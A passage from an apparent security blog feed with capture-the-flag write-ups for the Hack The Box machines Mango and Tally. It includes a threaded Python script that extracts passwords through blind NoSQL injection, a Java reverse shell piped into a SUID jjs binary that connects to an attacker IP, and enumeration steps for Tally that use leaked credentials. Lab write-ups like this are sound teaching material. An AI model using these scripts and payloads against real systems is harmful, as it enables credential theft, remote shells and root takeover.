</span>	<span class="k">print</span> <span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span> <span class="o">+</span> <span class="s">"[*] the password for "</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">" is... "</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">character</span><span class="p">),</span> <span class="n">flush</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
	<span class="c1"># sending the request without following redirects
</span>	<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span> <span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="c1"># return true if the status code is the 302 redirection
</span>	<span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
		<span class="k">return</span> <span class="bp">True</span>

</code></pre></div></div>
<h3 id="the-2nd-part-creating-the-worker-functions-7-total-to-evenly-distribute-and-iterate-over-all-characters-in-parallel">The 2nd Part: Creating the worker functions (7 total) to evenly distribute and iterate over all characters in parallel</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 1st half of the lowercase alphabet (13 total)
</span><span class="k">def</span> <span class="nf">alpha_L1</span><span class="p">():</span>
	<span class="c1"># the catch variable represents a valid character found, this is used for stopping all workers when a match is found instead of continuing to search
</span>	<span class="k">global</span> <span class="n">catch</span>
	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">13</span><span class="p">]:</span>
		<span class="c1"># if the catch variable isn't empty (i.e another worker caught the right character), be a smart worker and stop searching ;]
</span>		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
			<span class="k">return</span>
		<span class="c1"># if the test function returns true, set the catch variable and stop searching :D
</span>		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
			<span class="k">break</span>

<span class="c1"># 2nd half of the lowercase alphabet (13 total)
</span><span class="k">def</span> <span class="nf">alpha_L2</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">catch</span>
	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">13</span><span class="p">:</span><span class="mi">26</span><span class="p">]:</span>
		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
			<span class="k">return</span>
		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
			<span class="k">break</span>

<span class="c1"># 1st half of the uppercase alphabet (13 total)
</span><span class="k">def</span> <span class="nf">alpha_U1</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">catch</span>
	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">26</span><span class="p">:</span><span class="mi">39</span><span class="p">]:</span>
		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
			<span class="k">return</span>			
		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
			<span class="k">break</span>

<span class="c1"># 2nd half of the uppercase alphabet (13 total)
</span><span class="k">def</span> <span class="nf">alpha_U2</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">catch</span>
	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">39</span><span class="p">:</span><span class="mi">53</span><span class="p">]:</span>
		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
			<span class="k">return</span>			
		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
			<span class="k">break</span>

<span class="c1"># numbers (10 total)
</span><span class="k">def</span> <span class="nf">numbers</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">catch</span>
	<span class="k">for</span> <span class="n">digit</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
			<span class="k">return</span>
		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">digit</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
			<span class="n">catch</span> <span class="o">=</span> <span class="n">digit</span>
			<span class="k">break</span>

<span class="c1"># 1st half of symbols (16 total)
</span><span class="k">def</span> <span class="nf">symbols_1</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">catch</span>
	<span class="k">for</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">16</span><span class="p">]:</span>
		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
			<span class="k">return</span>
		<span class="c1"># these symbols are escaped because they have connotations in the regular expressions language
</span>		<span class="k">if</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'^'</span><span class="p">,</span> <span class="s">'.'</span><span class="p">,</span> <span class="s">'*'</span><span class="p">,</span> <span class="s">'+'</span><span class="p">,</span> <span class="s">'?'</span><span class="p">,</span> <span class="s">'|'</span><span class="p">,</span> <span class="s">'$'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">]:</span>
			<span class="n">symbol</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="si">{</span><span class="n">symbol</span><span class="si">}</span><span class="s">"</span>
		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">symbol</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
			<span class="n">catch</span> <span class="o">=</span> <span class="n">symbol</span>
			<span class="k">break</span>

<span class="c1"># 2nd half of symbols (16 total)
</span><span class="k">def</span> <span class="nf">symbols_2</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">catch</span>
	<span class="k">for</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">33</span><span class="p">]:</span>
		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
			<span class="k">return</span>
		<span class="k">if</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'^'</span><span class="p">,</span> <span class="s">'.'</span><span class="p">,</span> <span class="s">'*'</span><span class="p">,</span> <span class="s">'+'</span><span class="p">,</span> <span class="s">'?'</span><span class="p">,</span> <span class="s">'|'</span><span class="p">,</span> <span class="s">'$'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">]:</span>
			<span class="n">symbol</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="si">{</span><span class="n">symbol</span><span class="si">}</span><span class="s">"</span>	
		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">symbol</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
			<span class="n">catch</span> <span class="o">=</span> <span class="n">symbol</span>
			<span class="k">break</span>
</code></pre></div></div>
<h3 id="the-3rd-part-starting-the-workers-and-letting-them-retrieve-the-passwords-for-both-usernames">The 3rd Part: Starting the workers and letting them retrieve the passwords for both usernames</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># we target both the admin and the mango users, we enumerated the latter using the alternative code above in the test function
</span><span class="n">target_users</span> <span class="o">=</span> <span class="p">[</span><span class="s">"admin"</span><span class="p">,</span> <span class="s">"mango"</span><span class="p">]</span>

<span class="c1"># foreach user, start with an empty password/catch variables
</span><span class="k">for</span> <span class="n">target_user</span> <span class="ow">in</span> <span class="n">target_users</span><span class="p">:</span>
	<span class="n">password</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">catch</span> <span class="o">=</span> <span class="s">""</span>

	<span class="c1"># add each of worker functions to the threads array
</span>	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
		<span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_L1</span><span class="p">)</span>
		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_L2</span><span class="p">)</span>
		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_U1</span><span class="p">)</span>
		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_U2</span><span class="p">)</span>
		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>	
		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">numbers</span><span class="p">)</span>
		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>	
		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">symbols_1</span><span class="p">)</span>
		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">symbols_2</span><span class="p">)</span>
		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>

		<span class="c1"># start the workers
</span>		<span class="k">for</span> <span class="n">worker</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
			<span class="n">worker</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>

		<span class="c1"># wait for workers to finish
</span>		<span class="k">for</span> <span class="n">worker</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
			<span class="n">worker</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>

		<span class="c1"># if there was no catch, break because that means we have the complete password
</span>		<span class="k">if</span> <span class="n">catch</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
			<span class="k">break</span>
		<span class="c1"># if there was a catch, append it to the password and clear out the variable
</span>		<span class="n">password</span> <span class="o">+=</span> <span class="n">catch</span>
		<span class="n">catch</span> <span class="o">=</span> <span class="s">""</span>

	<span class="c1"># print out the password at the end for each user
</span>	<span class="k">print</span> <span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span> <span class="o">+</span> <span class="s">"[+] the password for "</span> <span class="o">+</span> <span class="n">target_user</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">password</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">25</span><span class="p">))</span>
</code></pre></div></div>

<p>Here’s <strong><em>what the script looks like during run-time:</em></strong></p>

<p><img src="/assets/Mango/getting-passwords.gif" alt="" /></p>

<p><strong>pretty cool, huh? :]</strong></p>

<p><strong><em>to compare its performance,</em></strong> we prepended the <code class="language-plaintext highlighter-rouge">time</code> command to both scripts.</p>

<p>This version <strong>finished enumerating both passwords</strong> in <strong>1 minute and 5 seconds.</strong></p>

<p><img src="/assets/Mango/time-for-multi-threaded-python-script.jpg" alt="" /></p>

<p>which is a <strong>huge improvement</strong> from the <strong>single-threaded version</strong> which <strong>needed almost 9 minutes!</strong></p>

<p><img src="/assets/Mango/time-for-single-threaded-python-script.jpg" alt="" /></p>

<h2 id="gaining-foothold-and-pivoting">Gaining Foothold and Pivoting</h2>
<p><em>Moving on,</em> <em>when we tried to log in as</em> <code class="language-plaintext highlighter-rouge">admin</code>, it didn’t work. The <code class="language-plaintext highlighter-rouge">mango</code> user had access though.</p>

<p><img src="/assets/Mango/ssh-as-mango.jpg" alt="" /></p>

<p><em>From inside,</em> we could <strong>pivot</strong> to the <code class="language-plaintext highlighter-rouge">admin</code> user with <code class="language-plaintext highlighter-rouge">su</code> since <strong><em>he was using the same password</em></strong> we found.</p>

<p><img src="/assets/Mango/pivot-to-admin-user.jpg" alt="" /></p>

<h2 id="suid-privilege-escalation">SUID Privilege Escalation</h2>

<p><em>Looking for easy setuid wins,</em> We ran the <code class="language-plaintext highlighter-rouge">find</code> command below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-ls</span> 2&gt;/dev/null
</code></pre></div></div>

<p>and found a <strong>strange binary</strong> called <code class="language-plaintext highlighter-rouge">jjs</code> with the <strong>SUID bit</strong> set:</p>

<p><img src="/assets/Mango/jjs-suid-found.jpg" alt="" /></p>

<p>We <strong>looked it up</strong> and found the below <strong>description</strong> on <a href="https://docs.oracle.com/en/java/javase/13/docs/specs/man/jjs.html">Oracle Docs</a>. It was <strong>exactly what we needed</strong> <strong><em>*evil smile*</em></strong></p>

<p><img src="/assets/Mango/jjs-command.jpg" alt="" /></p>

<p><em>To check for ways to exploit it,</em> we searched <a href="https://gtfobins.github.io/gtfobins/jjs/">GTFOBins</a> and found the below:</p>

<p><img src="/assets/Mango/jjs-on-gtfo-bins.jpg" alt="" /></p>

<p>Seems <strong>pretty straightforward</strong>. A <strong>standard Java reverse shell payload</strong>.</p>

<p><strong>An Important Note:</strong> <em>to</em> <strong><em>inherit the permissions</em></strong> <em>from the</em> <code class="language-plaintext highlighter-rouge">jjs</code> <em>binary and</em> <strong><em>get code execution as</em></strong> <code class="language-plaintext highlighter-rouge">root</code>, we have to <strong>modify the payload</strong> on the <strong>6th line</strong> and call <code class="language-plaintext highlighter-rouge">bash</code> with the <code class="language-plaintext highlighter-rouge">-p</code> flag instead.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">RHOST</span><span class="o">=</span>10.10.16.9
<span class="nb">export </span><span class="nv">RPORT</span><span class="o">=</span>9000
<span class="nb">echo</span> <span class="s1">'var host=Java.type("java.lang.System").getenv("RHOST");
var port=Java.type("java.lang.System").getenv("RPORT");
var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
var p=new ProcessBuilder("/bin/bash", "-p").redirectErrorStream(true).start();
var Socket = Java.type("java.net.Socket");
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()&gt;0)so.write(pi.read()); while(pe.available()&gt;0)so.write(pe.read()); while(si.available()&gt;0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'</span> | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
</code></pre></div></div>

<p>we start our <code class="language-plaintext highlighter-rouge">ncat</code> listener and <strong>set the required environment variables</strong> over on the victim machine before <strong>executing the shell.</strong></p>

<p><img src="/assets/Mango/rooted.jpg" alt="" /></p>

<p><em>from the effective UID</em> <code class="language-plaintext highlighter-rouge">euid=0(root)</code>, we’re now acting as <code class="language-plaintext highlighter-rouge">root</code> :)</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Tally</title><link href="http://localhost:4000/2022/08/31/Tally.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Tally" /><published>2022-08-31T00:00:00+02:00</published><updated>2022-08-31T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/31/Tally</id><content type="html" xml:base="http://localhost:4000/2022/08/31/Tally.html"><![CDATA[<p><img src="/assets/Tally/Tally.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li><strong>Tally</strong> is a great box with <strong>multiple exploit paths</strong> for both <strong>initial access</strong> as well as <strong>privilege escalation.</strong></li>
  <li><em>Intially,</em> we find a <strong>SharePoint site</strong> on port 80 which we enumerate to find <strong>a page with a couple of interesting bits of information.</strong></li>
  <li><strong>One: being credentials for the listening FTP service.</strong></li>
  <li><strong>Two: being intel</strong> about an <strong>HTML document</strong> to be <strong>uploaded to the FTP share for review</strong> by another user.</li>
  <li><em>After successfully logging into FTP,</em> we find an <strong>installer for a specific version of Firefox</strong> which was <strong>vulnerable to an RCE vulnerability.</strong></li>
  <li><em>Having confirmed that the victim was using that version,</em> we <strong>planted a malicious HTML payload</strong> but <strong>failed to get code execution</strong> due to the <strong><em>inconsistency of the exploit. (this part is covered last <a href="#chasing-the-firefox-exploit-down-a-rabbit-hole">here</a>)</em></strong></li>
  <li><em>Moving along,</em> we went through <strong>FTP</strong> to find a <strong>KeePass database file</strong> which we crack open and gain <strong>creds for an SMB share</strong>.</li>
  <li><em>On it,</em> we find a <strong>custom binary</strong> that <strong>contained credentials</strong> for the <code class="language-plaintext highlighter-rouge">sa</code> database user on the running <strong>MSSQL instance.</strong></li>
  <li><em>After logging in using the</em> <code class="language-plaintext highlighter-rouge">sqsh</code> <em>command-line utility,</em> we enabled the <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> feature and were able to <strong>execute a reverse shell</strong> and get on the system as the <code class="language-plaintext highlighter-rouge">sarah</code> user.</li>
  <li><em>Having gained access through MSSQL,</em> we had the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> enabled which we easily <strong>exploited using Juicy Potato</strong> to escalate our privileges to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\System</code>.</li>
  <li>There was <strong>another unintended path</strong> for privesc using a <strong>modifiable PowerShell script</strong> that was on <code class="language-plaintext highlighter-rouge">sarah</code>’s desktop <strong>running as a scheduled task</strong> under the <code class="language-plaintext highlighter-rouge">Administrator</code> user.</li>
  <li>We <strong>added our payload to that script</strong> and <strong>owned the box a second way.</strong></li>
  <li>A third path <strong><em>-which was the intended one-</em></strong> was using <strong>CVE-2017-0213</strong>. We found the <strong>C++ PoC</strong> for it <strong>on GitHub</strong> but couldn’t compile it at first due to an error.</li>
  <li>We <strong>did some research</strong> and were able to <strong>build the exploit binary</strong>. The <strong>exploitation was tricky</strong> because only the <strong>x86 version of the binary worked</strong> as well as <strong>had the requirement of running as an interactive process.</strong> Which we achieved with <strong>a Meterpreter session.</strong></li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-generator: Microsoft SharePoint
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://tally/_layouts/15/start.aspx#/default.aspx
81/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-08-23T12:49:21
|_Not valid after:  2052-08-23T12:49:21
|_ssl-date: 2022-08-23T13:01:38+00:00; 0s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
15567/tcp open  http               Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| http-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
|_http-title: Site doesn't have a title.
32843/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
32844/tcp open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2022-08-23T13:01:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
| Subject Alternative Name: DNS:localhost, DNS:tally
| Not valid before: 2017-09-17T22:51:16
|_Not valid after:  9999-01-01T00:00:00
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Service Unavailable
32846/tcp open  storagecraft-image StorageCraft Image Manager
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc              Microsoft Windows RPC
49665/tcp open  msrpc              Microsoft Windows RPC
49666/tcp open  msrpc              Microsoft Windows RPC
49667/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
49669/tcp open  msrpc              Microsoft Windows RPC
49670/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.10.10.59:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2022-08-23T13:00:42
|_  start_date: 2022-08-23T12:49:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">nmap</code> gives us a bunch of information:</p>
<ol>
  <li><strong>FTP</strong> port open</li>
  <li>There’s a <strong>Microsoft SharePoint</strong> Instance on port 80</li>
  <li><strong>RPC</strong> and <strong>SMB</strong> are available on their standard ports</li>
  <li><strong>MSSQL</strong> is there on default port 1433</li>
  <li><strong>WinRM</strong> available</li>
  <li>An <strong>unknown HTTP port</strong> on 15567</li>
  <li>Also <strong>81, 808 and 32846</strong> which don’t look familiar</li>
</ol>

<p><em>to</em> <strong><em>avoid unnecessary confusion,</em></strong> we’ll <strong>start with the ports we know first..</strong></p>

<h2 id="quick-ftp-check">Quick FTP Check</h2>
<p>we first <strong>pass by FTP</strong> looking for <strong><em>freebies</em></strong> :)</p>

<p><img src="/assets/Tally/no-ftp-anon.jpg" alt="" /></p>

<p><strong>anonymous login</strong> wasn’t allowed.</p>

<h2 id="enumerating-sharepoint">Enumerating Sharepoint</h2>
<p><em>Checking the website,</em> we get redirected to <code class="language-plaintext highlighter-rouge">/_layouts/15/start.aspx#/default.aspx</code> which had nothing.</p>

<p><img src="/assets/Tally/sharepoint-home-page.jpg" alt="" /></p>

<p><em>But, To</em> <strong><em>properly enumerate SharePoint,</em></strong> we need a <strong>wordlist</strong> for its web directories.</p>

<p>This <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/sharepoint.txt">one</a> from the <strong>SecLists Repository</strong> seemed good.</p>

<p>We launched <code class="language-plaintext highlighter-rouge">gobuster</code> specifying the <code class="language-plaintext highlighter-rouge">--timeout</code> flag to <strong>60 seconds</strong> since <strong>SharePoint was very slow :/</strong></p>

<p><img src="/assets/Tally/gobuster.jpg" alt="" /></p>

<p><em>Out of the many pages,</em> one was special: <code class="language-plaintext highlighter-rouge">/_layouts/15/viewlsts.aspx</code></p>

<p><img src="/assets/Tally/sharepoint-file-list.jpg" alt="" /></p>

<p>The <strong>“Documents”</strong> list had something interesting</p>

<p><img src="/assets/Tally/documents-sub-site.jpg" alt="" /></p>

<p><em>When we opened the file,</em> we found ourselves a <strong>password :)</strong></p>

<p><img src="/assets/Tally/ftp-details-document.jpg" alt="" /></p>

<p>the <strong>“Site Pages”</strong> list also had something:</p>

<p><img src="/assets/Tally/site-pages-list.jpg" alt="" /></p>

<p><strong>a lot of information was there</strong></p>

<p><img src="/assets/Tally/migration-update-note.jpg" alt="" /></p>

<ul>
  <li>we got 4 <strong>usernames:</strong> <code class="language-plaintext highlighter-rouge">rahul</code>, <code class="language-plaintext highlighter-rouge">ftp_user</code>, <code class="language-plaintext highlighter-rouge">sarah</code> &amp; <code class="language-plaintext highlighter-rouge">tim</code></li>
  <li>we now know <code class="language-plaintext highlighter-rouge">rahul</code> is <strong><em>expected to put</em></strong> an <code class="language-plaintext highlighter-rouge">index.html</code> file up on the <code class="language-plaintext highlighter-rouge">Intranet</code> folder on the FTP share which either <code class="language-plaintext highlighter-rouge">sarah</code> or <code class="language-plaintext highlighter-rouge">tim</code> will open.</li>
</ul>

<p>This is could very well be a <strong>client-side attack vector.</strong></p>

<p><em>but first,</em> let’s <strong>test those credentials</strong> against both <strong>SMB and FTP</strong></p>

<p><img src="/assets/Tally/smb-worked-for-ftp-user.jpg" alt="" /></p>

<p><strong>SMB worked</strong>. but there were <strong>no permissions over any shares.</strong></p>

<p><img src="/assets/Tally/no-shares-available.jpg" alt="" /></p>

<p><strong>Enumerating local users</strong> with the <code class="language-plaintext highlighter-rouge">--users</code> flag failed.</p>

<p><img src="/assets/Tally/user-enumeration.jpg" alt="" /></p>

<p>But <strong>RID brute-forcing</strong> worked and got us <strong>every user on the box</strong>. This might come in handy.</p>

<p><img src="/assets/Tally/user-enumeration-rid-brute.jpg" alt="" /></p>

<p><strong>that was it</strong> for <strong>SMB.</strong></p>

<p>We then <strong>tested the creds with FTP</strong> and found the <code class="language-plaintext highlighter-rouge">ftp_user</code> valid -as expected-.</p>

<p><img src="/assets/Tally/ftp-access-confirmed-hydra.jpg" alt="" /></p>

<h2 id="ftp-share-enumeration">FTP Share Enumeration</h2>

<p><img src="/assets/Tally/ftp-directories.jpg" alt="" /></p>

<p><em>After</em> <strong><em>browsing the share</em></strong> and <strong><em>finding a lot of files/folders there,</em></strong> we decided to <strong>download it</strong>. For both <strong>speed</strong> and <strong>for leveraging tools like</strong> <code class="language-plaintext highlighter-rouge">find</code> <strong>for search and what not.</strong></p>

<p>we do so with <code class="language-plaintext highlighter-rouge">wget</code>’s <code class="language-plaintext highlighter-rouge">-m</code> flag <strong><em>(for mirroring).</em></strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">-m</span> ftp://ftp_user:<span class="s1">'UTDRSCH53c"$6hys'</span>@tally
</code></pre></div></div>

<p><em>while browsing the contents,</em> we found a <strong>KeePass file</strong> in <code class="language-plaintext highlighter-rouge">tim</code>’s folder.</p>

<p><img src="/assets/Tally/keepass-file-found.jpg" alt="" /></p>

<p>we <strong>converted it to a hash</strong> using <code class="language-plaintext highlighter-rouge">keepass2john</code> and <strong>cracked it.</strong></p>

<p><img src="/assets/Tally/keepass-pass-cracked.jpg" alt="" /></p>

<p>we carried the <code class="language-plaintext highlighter-rouge">.kdbx</code> file over <strong>to our windows VM</strong> along with the <strong>KeePass program files</strong> that were on the share then <strong>ran the application.</strong></p>

<p><em>Inside,</em> we found <strong>a password for a share called ACCT</strong> (<em>we saw that earlier when enumerating SMB</em>)</p>

<p><img src="/assets/Tally/keepass-passwords.jpg" alt="" /></p>

<p>and <strong>another password</strong> that is <em>most likely</em> for <strong>a Cisco product.</strong></p>

<p><img src="/assets/Tally/cisco-password.jpg" alt="" /></p>

<p><em>Automatically,</em> we <strong>shuffle the usernames/passwords</strong> and <strong>spray</strong></p>

